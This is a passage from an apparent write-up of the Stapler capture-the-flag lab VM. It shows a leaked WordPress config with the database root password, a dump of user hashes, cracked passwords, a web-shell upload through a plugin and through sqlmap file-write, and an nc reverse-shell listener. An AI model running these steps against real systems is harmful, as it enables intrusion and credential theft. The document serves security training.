</span><span class='line'> * Codex page. You can get the MySQL settings from your web host.
</span><span class='line'> * This file is used by the wp-config.php creation script during the
</span><span class='line'> * installation. You don<span class="s1">&#39;t have to use the web site, you can just copy this file</span>
</span><span class='line'><span class="s1"> * to &quot;wp-config.php&quot; and fill in the values.</span>
</span><span class='line'><span class="s1"> * @package WordPress</span>
</span><span class='line'><span class="s1">// ** MySQL settings - You can get this info from your web host ** //</span>
</span><span class='line'><span class="s1">/** The name of the database for WordPress */</span>
</span><span class='line'><span class="s1">define(&#39;</span>DB_NAME<span class="s1">&#39;, &#39;</span>wordpress<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">/** MySQL database username */</span>
</span><span class='line'><span class="s1">define(&#39;</span>DB_USER<span class="s1">&#39;, &#39;</span>root<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">/** MySQL database password */</span>
</span><span class='line'><span class="s1">define(&#39;</span>DB_PASSWORD<span class="s1">&#39;, &#39;</span>plbkac<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">/** MySQL hostname */</span>
</span><span class='line'><span class="s1">define(&#39;</span>DB_HOST<span class="s1">&#39;, &#39;</span>localhost<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">/** Database Charset to use in creating database tables. */</span>
</span><span class='line'><span class="s1">define(&#39;</span>DB_CHARSET<span class="s1">&#39;, &#39;</span>utf8mb4<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">/** The Database Collate type. Don&#39;</span>t change this <span class="k">if</span> in doubt. */
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;DB_COLLATE&#39;</span>, <span class="s1">&#39;&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/**#@+
</span><span class='line'> * Authentication Unique Keys and Salts.
</span><span class='line'> * Change these to different unique phrases!
</span><span class='line'> * You can generate these using the <span class="o">{</span>@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service<span class="o">}</span>
</span><span class='line'> * You can change these at any point in <span class="nb">time </span>to invalidate all existing cookies. This will force all users to have to log in again.
</span><span class='line'> * @since 2.6.0
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;AUTH_KEY&#39;</span>,         <span class="s1">&#39;V 5p=[.Vds8~SX;&gt;t)++Tt57U6{Xe`T|oW^eQ!mHr }]&gt;9RX07W&lt;sZ,I~`6Y5-T:&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;SECURE_AUTH_KEY&#39;</span>,  <span class="s1">&#39;vJZq=p.Ug,]:&lt;-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&amp;!/#&gt;4#K7eFP5-av`n)2&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;LOGGED_IN_KEY&#39;</span>,    <span class="s1">&#39;ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU&lt;cr.wm?|jqZH:YMv;zu@tM7P:4o&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;NONCE_KEY&#39;</span>,        <span class="s1">&#39;j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;AUTH_SALT&#39;</span>,        <span class="s1">&#39;I{gDlDs`Z@.+/AdyzYw4%+&lt;WsO-LDBHT}&gt;}!||Xrf@1E6jJNV={p1?yMKYec*OI$&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;SECURE_AUTH_SALT&#39;</span>, <span class="s1">&#39;.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*&gt;#z+p&gt;nVi10`XOUq (Zml~op3SG4OG_D&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;LOGGED_IN_SALT&#39;</span>,   <span class="s1">&#39;[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&amp;_nP4{D}n=y=FQt%zJw&gt;c[a+;ppCzIkt;&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;NONCE_SALT&#39;</span>,       <span class="s1">&#39;tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/**#@-*/
</span><span class='line'> * WordPress Database Table prefix.
</span><span class='line'> * You can have multiple installations in one database <span class="k">if</span> you give each a unique
</span><span class='line'> * prefix. Only numbers, letters, and underscores please!
</span><span class='line'><span class="nv">$table_prefix</span>  <span class="o">=</span> <span class="s1">&#39;wp_&#39;</span><span class="p">;</span>
</span><span class='line'> * For developers: WordPress debugging mode.
</span><span class='line'> * Change this to <span class="nb">true </span>to <span class="nb">enable </span>the display of notices during development.
</span><span class='line'> * It is strongly recommended that plugin and theme developers use WP_DEBUG
</span><span class='line'> * in their development environments.
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;WP_DEBUG&#39;</span>, <span class="nb">false</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/* That<span class="s1">&#39;s all, stop editing! Happy blogging. */</span>
</span><span class='line'><span class="s1">/** Absolute path to the WordPress directory. */</span>
</span><span class='line'><span class="s1">if ( !defined(&#39;</span>ABSPATH<span class="s1">&#39;) )</span>
</span><span class='line'><span class="s1"> define(&#39;</span>ABSPATH<span class="s1">&#39;, dirname(__FILE__) . &#39;</span>/<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">/** Sets up WordPress vars and included files. */</span>
</span><span class='line'><span class="s1">require_once(ABSPATH . &#39;</span>wp-settings.php<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">define(&#39;</span>WP_HTTP_BLOCK_EXTERNAL<span class="err">&#39;</span>, <span class="nb">true</span><span class="o">)</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now I got the MySQL database ROOT login password and the DB name:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>DB_USER: root
</span><span class='line'>DB_PASS: plbkac
</span><span class='line'>DB_NAME: wordpress
</span></code></pre></td></tr></table></div></figure>


<p>When exploiting the Local File Inclusion vulnerability, I found the full path disclosure as well when a non-exist file name is given.</p>

<p>The full path is <font color="red"><code>/var/www/https/blogblog/</code></font></p>

<p><img class="left" src="/downloads/stapler/3.png"></p>

<p>Due to obtain the MySQL root and password, I was connected to target MySQL server with ROOT priviledge.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# mysql -h 10.1.1.138 -u root -p
</span><span class='line'>Enter password:
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
</span><span class='line'>Your MySQL connection id is 8514
</span><span class='line'>Server version: 5.7.13-0ubuntu0.16.04.2 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2016, Oracle and/or its affiliates. All rights reserved.
</span><span class='line'>
</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.
</span><span class='line'>
</span><span class='line'>Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
</span><span class='line'>
</span><span class='line'>mysql&gt; show databases<span class="p">;</span>
</span><span class='line'>+--------------------+
</span><span class='line'><span class="p">|</span> Database           <span class="p">|</span>
</span><span class='line'>+--------------------+
</span><span class='line'><span class="p">|</span> information_schema <span class="p">|</span>
</span><span class='line'><span class="p">|</span> loot               <span class="p">|</span>
</span><span class='line'><span class="p">|</span> mysql              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> performance_schema <span class="p">|</span>
</span><span class='line'><span class="p">|</span> phpmyadmin         <span class="p">|</span>
</span><span class='line'><span class="p">|</span> proof              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> sys                <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wordpress          <span class="p">|</span>
</span><span class='line'>+--------------------+
</span><span class='line'><span class="m">8</span> rows in <span class="nb">set</span> <span class="o">(</span>0.02 sec<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>mysql&gt; use wordpress<span class="p">;</span>
</span><span class='line'>Reading table information <span class="k">for</span> completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A
</span><span class='line'>
</span><span class='line'>Database changed
</span><span class='line'>mysql&gt; show tables<span class="p">;</span>
</span><span class='line'>+-----------------------+
</span><span class='line'><span class="p">|</span> Tables_in_wordpress   <span class="p">|</span>
</span><span class='line'>+-----------------------+
</span><span class='line'><span class="p">|</span> wp_commentmeta        <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_comments           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_links              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_options            <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_postmeta           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_posts              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_term_relationships <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_term_taxonomy      <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_terms              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_usermeta           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_users              <span class="p">|</span>
</span><span class='line'>+-----------------------+
</span><span class='line'><span class="m">11</span> rows in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>mysql&gt;
</span><span class='line'>mysql&gt; <span class="k">select</span> * from wp_users<span class="p">;</span>
</span><span class='line'>+----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
</span><span class='line'><span class="p">|</span> ID <span class="p">|</span> user_login <span class="p">|</span> user_pass                          <span class="p">|</span> user_nicename <span class="p">|</span> user_email            <span class="p">|</span> user_url         <span class="p">|</span> user_registered     <span class="p">|</span> user_activation_key <span class="p">|</span> user_status <span class="p">|</span> display_name    <span class="p">|</span>
</span><span class='line'>+----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
</span><span class='line'><span class="p">|</span>  <span class="m">1</span> <span class="p">|</span> John       <span class="p">|</span> <span class="nv">$P$B7889EMq</span>/erHIuZapMB8GEizebcIy9. <span class="p">|</span> john          <span class="p">|</span> john@red.localhost    <span class="p">|</span> http://localhost <span class="p">|</span> 2016-06-03 23:18:47 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> John Smith      <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">2</span> <span class="p">|</span> Elly       <span class="p">|</span> <span class="nv">$P$BlumbJRRBit7y50Y17</span>.UPJ/xEgv4my0 <span class="p">|</span> elly          <span class="p">|</span> Elly@red.localhost    <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:11:33 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Elly Jones      <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">3</span> <span class="p">|</span> Peter      <span class="p">|</span> <span class="nv">$P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0</span> <span class="p">|</span> peter         <span class="p">|</span> peter@red.localhost   <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:13:16 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Peter Parker    <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">4</span> <span class="p">|</span> barry      <span class="p">|</span> <span class="nv">$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0</span> <span class="p">|</span> barry         <span class="p">|</span> barry@red.localhost   <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:14:26 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Barry Atkins    <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">5</span> <span class="p">|</span> heather    <span class="p">|</span> <span class="nv">$P$Bwd0VpK8hX4aN</span>.rZ14WDdhEIGeJgf10 <span class="p">|</span> heather       <span class="p">|</span> heather@red.localhost <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:18:04 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Heather Neville <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">6</span> <span class="p">|</span> garry      <span class="p">|</span> <span class="nv">$P$BzjfKAHd6N4cHKiugLX</span>.4aLes8PxnZ1 <span class="p">|</span> garry         <span class="p">|</span> garry@red.localhost   <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:18:23 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> garry           <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">7</span> <span class="p">|</span> harry      <span class="p">|</span> <span class="nv">$P$BqV</span>.SQ6OtKhVV7k7h1wqESkMh41buR0 <span class="p">|</span> harry         <span class="p">|</span> harry@red.localhost   <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:18:41 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> harry           <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">8</span> <span class="p">|</span> scott      <span class="p">|</span> <span class="nv">$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1</span> <span class="p">|</span> scott         <span class="p">|</span> scott@red.localhost   <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:18:59 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> scott           <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">9</span> <span class="p">|</span> kathy      <span class="p">|</span> <span class="nv">$P$BZlxAMnC6ON</span>.PYaurLGrhfBi6TjtcA0 <span class="p">|</span> kathy         <span class="p">|</span> kathy@red.localhost   <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:19:14 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> kathy           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="m">10</span> <span class="p">|</span> tim        <span class="p">|</span> <span class="nv">$P$BXDR7dLIJczwfuExJdpQqRsNf</span>.9ueN0 <span class="p">|</span> tim           <span class="p">|</span> tim@red.localhost     <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:19:29 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> tim             <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="m">11</span> <span class="p">|</span> ZOE        <span class="p">|</span> <span class="nv">$P$B</span>.gMMKRP11QOdT5m1s9mstAUEDjagu1 <span class="p">|</span> zoe           <span class="p">|</span> zoe@red.localhost     <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:19:50 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> ZOE             <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="m">12</span> <span class="p">|</span> Dave       <span class="p">|</span> <span class="nv">$P$Bl7</span>/V9Lqvu37jJT.6t4KWmY.v907Hy. <span class="p">|</span> dave          <span class="p">|</span> dave@red.localhost    <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:20:09 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Dave            <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="m">13</span> <span class="p">|</span> Simon      <span class="p">|</span> <span class="nv">$P$BLxdiNNRP008kOQ</span>.jE44CjSK/7tEcz0 <span class="p">|</span> simon         <span class="p">|</span> simon@red.localhost   <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:20:35 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Simon           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="m">14</span> <span class="p">|</span> Abby       <span class="p">|</span> <span class="nv">$P$ByZg5mTBpKiLZ5KxhhRe</span>/uqR.48ofs. <span class="p">|</span> abby          <span class="p">|</span> abby@red.localhost    <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:20:53 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Abby            <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="m">15</span> <span class="p">|</span> Vicki      <span class="p">|</span> <span class="nv">$P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131</span> <span class="p">|</span> vicki         <span class="p">|</span> vicki@red.localhost   <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:21:14 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Vicki           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="m">16</span> <span class="p">|</span> Pam        <span class="p">|</span> <span class="nv">$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0</span> <span class="p">|</span> pam           <span class="p">|</span> pam@red.localhost     <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:42:23 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Pam             <span class="p">|</span>
</span><span class='line'>+----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
</span><span class='line'><span class="m">16</span> rows in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>mysql&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Then I use <code>john the ripper</code> to crack those hahses and got the following cracked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# john --show 2.txt
</span><span class='line'>John:incorrect
</span><span class='line'>Elly:ylle
</span><span class='line'>barry:washere
</span><span class='line'>heather:passphrase
</span><span class='line'>garry:football
</span><span class='line'>harry:monkey
</span><span class='line'>scott:cookie
</span><span class='line'>kathy:coolgirl
</span><span class='line'>tim:thumb
</span><span class='line'>ZOE:partyqueen
</span><span class='line'>Dave:damachine
</span><span class='line'>Pam:0520
</span><span class='line'>
</span><span class='line'><span class="m">12</span> password hashes cracked, <span class="m">4</span> left
</span></code></pre></td></tr></table></div></figure>


<p>After tried all cracked user/password, I found <code>john</code> has higher priviledge and can be used to upload reverse web shell.</p>

<p>Login to WordPress with john&rsquo;s password, and then upload <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">pentestmonkey&rsquo;s PHP reverse shell</a>(listen on local port 443) as a plugin.</p>

<p><img class="left" src="/downloads/stapler/4.png"></p>

<p>After installed the plugin, I went to <code>https://10.1.1.138:12380/blogblog/wp-content/uploads/</code> to check if the file has been uploaded.</p>

<p><img class="left" src="/downloads/stapler/5.png"></p>

<p>Greet! The web shell file <code>rsh.php</code> has already been uploaded successfully.</p>

<p>In terms to upload web shell, there is another method by using MySQL to write file.</p>

<p>From the previous stage, I got the full path is <font color="red"><code>/var/www/https/blogblog/</code></font> and also the writable directory is <font color="red"><code>/blogblog/wp-content/uploads/</code></font>. And the target MySQL root login password is <font color="red"><code>plbkac</code></font>.</p>

<p>So, now, I should be able to write web shell to target server via MySQL:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# sqlmap -d mysql://root:plbkac@10.1.1.138:3306/wordpress --file-write<span class="o">=</span>rsh.php --file-dest<span class="o">=</span>/var/www/https/blogblog/wp-content/uploads/rsh443.php
</span><span class='line'>         _
</span><span class='line'> ___ ___<span class="p">|</span> <span class="p">|</span>_____ ___ ___  <span class="o">{</span>1.0.5.0#dev<span class="o">}</span>
</span><span class='line'><span class="p">|</span>_ -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="s1">&#39;| . |</span>
</span><span class='line'><span class="s1">|___|_  |_|_|_|_|__,|  _|</span>
</span><span class='line'><span class="s1">      |_|           |_|   http://sqlmap.org</span>
</span><span class='line'>
</span><span class='line'><span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> starting at 23:12:04
</span><span class='line'>
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.138:3306 established
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span>...
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span>...
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fingerprinting the back-end DBMS operating system
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;0&#39;</span><span class="o">]]</span>...
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS operating system is Linux
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>_mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="s2">&quot;Unknown table &#39;wordpress.sqlmapfile&#39;&quot;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:05<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>_mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="s2">&quot;Unknown table &#39;wordpress.sqlmapfilehex&#39;&quot;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:05<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>_mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="s2">&quot;Unknown table &#39;wordpress.sqlmapfile&#39;&quot;</span><span class="o">)</span>
</span><span class='line'><span class="k">do</span> you want confirmation that the <span class="nb">local </span>file <span class="s1">&#39;rsh.php&#39;</span> has been successfully written on the back-end DBMS file system <span class="o">(</span><span class="s1">&#39;/var/www/https/blogblog/wp-content/uploads/rsh443.php&#39;</span><span class="o">)</span>? <span class="o">[</span>Y/n<span class="o">]</span> Y
</span><span class='line'><span class="o">[</span>23:12:09<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the <span class="nb">local </span>file <span class="s1">&#39;rsh.php&#39;</span> and the remote file <span class="s1">&#39;/var/www/https/blogblog/wp-content/uploads/rsh443.php&#39;</span> have the same size <span class="o">(</span><span class="m">5495</span> B<span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:09<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>_mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="s2">&quot;Unknown table &#39;wordpress.sqlmapfilehex&#39;&quot;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:09<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.138:3306 closed
</span><span class='line'>root@kali:~/myExercises/stapler#
</span></code></pre></td></tr></table></div></figure>


<p>Great! looks like the web shell uploaded successfully.</p>

<p>Now got in and time to get ROOT.</p>

<p>Set up <code>nc</code> to listen on local port <code>443</code> and then trigger the shell to connect back by accessing the web shell page on <code>https://10.1.1.138:12380/blogblog/wp-content/uploads/rsh.php</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# nc -lvnp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
</span><span class='line'>connect to <span class="o">[</span>10.1.1.132<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.138<span class="o">]</span> 37668
